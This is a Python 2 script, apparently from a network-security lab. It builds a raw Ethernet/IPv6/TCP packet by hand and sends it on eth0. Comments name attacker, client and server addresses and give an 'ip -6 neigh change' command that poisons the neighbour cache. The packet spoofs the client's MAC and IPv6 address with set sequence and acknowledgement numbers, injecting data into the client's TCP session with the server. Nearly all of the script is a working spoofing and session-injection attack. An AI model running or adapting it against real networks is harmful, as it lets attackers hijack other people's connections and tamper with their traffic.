import socket
import utils
from fm import *

my_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))

def checksum(msg):
	su = 0	

	for i in range (0, len(msg),2):
		
	        w = (ord(msg[i]) << 8) + (ord(msg[i+1]))
		su = su + w

	su = (su >> 16) + (su & 0xffff)

	su = ~su & 0xffff 

	return su
def build_pseudo_header(src_ip, dest_ip, data, upper_layer_packet_length):
        zeros = '0000'
        next_header = "06"
        pseudo_header = src_ip + dest_ip + upper_layer_packet_length + zeros + next_header 
        return pseudo_header

def build_tcp_header(src_port, dest_port, seq_no, ack_no, header_length, ack_flag, syn_flag, fin_flag, push_flag, reset_flag, urg_flag, window_size, urg_pointer, options, src_add_ip, dst_add_ip, data):
	
	tcp_flags = fin_flag + (syn_flag << 1) + (reset_flag << 2) + (push_flag << 3) + (ack_flag << 4) + (urg_flag << 5)
        tcp_flags = '{0:02x}'.format(tcp_flags)
	tcp_checksum = '0000'

        tcp_header = src_port + dest_port + seq_no + ack_no + header_length + str(tcp_flags) + window_size + urg_pointer

	####creating pseudo header####
        pseudo_header = build_pseudo_header(src_add_ip, dst_add_ip, data, str(len(tcp_header) + len(data)))

	if (len(data) % 2 != 0):
		data = data + " "
	
	if (push_flag == 1):
	        pseudo_header = pseudo_header + tcp_header + data
	else:
		pseudo_header = pseudo_header + tcp_header

	tcp_checksum = checksum(pseudo_header)

        # TCP
        print("\n## BUILDING TCP PACKET SOURCE ")
        print("## Source port       " + src_port)
        print("## Destination port  " + dest_port)
        print("## Sequence number   " + seq_no)
        print("## Acknoledgment     " + ack_no)
        print("## Header length     " + header_length)
        print("## Flags             " + str(tcp_flags))
        print("## Window size       " + window_size)
        print("## Checksum          " + str(tcp_checksum))
        print("## Urgent pointer    " + urg_pointer)
        print("## Options           " + options)

        tcp_header = src_port + dest_port + seq_no + ack_no + header_length + str(tcp_flags) + window_size + str(tcp_checksum) + urg_pointer + options
	
	return tcp_header


if __name__ == "__main__":
        # ip attacker 20010000000000000000000000000021
        # ip client   20010000000000000000000000000020
        # ip server   20010000000000000000000000000022

        # mac attacker 000000aa0001
        # mac client   000000aa0000
        # mac server   000000aa0002

        # ip -6 neigh change 2001::20 lladdr 00:00:00:aa:00:01 dev eth0

        # ethernet
        mac_dest = "000000aa0002"
        mac_src =  "000000aa0000"
        eth_type = "86dd"
        ethernet_packet = mac_dest + mac_src + eth_type

        # ipv6
        version = "60"
        flow_label = "0b2605"
        payload_length = "0021"
        next_header = "06"
        hop_limit = "40"        
        ipv6_src =   "20010000000000000000000000000020"
        ipv6_dest  = "20010000000000000000000000000022"
        ipv6_packet = version + flow_label + payload_length + next_header + hop_limit + ipv6_src + ipv6_dest

        # tcp
        src_port = "94d2"
        dest_port = "543f"
        seq_no = "aab9ebb6"
        ack_no = "6f3a45d4"
        header_length = "80"
        ack_flag = 0
        syn_flag = 0
        fin_flag = 0
        push_flag = 0
        reset_flag = 0
        urg_flag = 0
        window_size = "00e0"
        urg_pointer = '0000'
        options = "0101080ad48c802f35f68d06"
        data = "63"

        # Ethernet
        print("\n## BUILDING ETHERNET PACKET SOURCE ")
        print("## Src Mac          " + mac_dest)
        print("## Dest Mac         " + mac_src)
        print("## Network Protocol " + eth_type)
        
        # IPV6
        print("\n## BUILDING IPV6 PACKET SOURCE ")
        print("## Version        " + version)
        print("## flow label     " + flow_label)
        print("## Payload length " + payload_length)
        print("## Next header    " + next_header)
        print("## Hop limit      " + hop_limit)
        print("## Src ipv6       " + ipv6_src)
        print("## Dest ipv6      " + ipv6_dest)   


        tcp_packet = build_tcp_header(src_port, dest_port, seq_no, ack_no,header_length, 1, 0, 0, 1, 0, 0, window_size, urg_pointer, options, ipv6_src, ipv6_dest, data)

        packet = ethernet_packet + ipv6_packet + tcp_packet + data

        print packet

        my_socket.sendto(packet.decode("hex"), ("eth0", 0))
